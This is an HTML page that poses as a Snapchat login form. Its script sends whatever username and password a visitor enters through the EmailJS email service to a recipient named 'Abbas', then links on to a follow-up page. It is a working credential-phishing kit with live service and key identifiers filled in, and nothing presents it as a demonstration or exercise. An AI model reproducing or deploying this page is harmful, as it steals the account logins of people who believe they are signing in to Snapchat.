<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Snapchat Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }

        .container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .container h2 {
            margin-bottom: 20px;
        }

        .container input[type="text"],
        .container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }

        .container button {
            padding: 10px;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: #3aae25;
        }

        .result {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            color: red;
        }
        a{
            text-decoration: none ;
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>Snapchat Login</h2>
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="submitForm()"><a href="/abbas.html/final.html">Submit</a></button>
        <div class="result" id="result"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@latest/dist/email.min.js"></script>
    <script>
        emailjs.init('YOUR_PUBLIC_KEY'); // get from your EmailJS Dashboard
    </script>
    <script>
        function submitForm() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            emailjs.init('YOUR_PUBLIC_KEY');

            // send email (serviceID, templateID, templateParams, [options])
            emailjs.send(
                'service_nzjnmuh',            // service ID from dashboard
                'template_sfkgdyj',           // template ID you created
                { name: 'Abbas', message: `Username is: ${username} and Password: ${password}` }, // template params
                'lKVCDNlUMWtwDXgsR'         // sometimes passed as 4th arg
            )
                .then(res => console.log('Email sent', res.status, res.text))
                .catch(err => console.error('Send error', err));

            
        }
    </script>
</body>

</html>
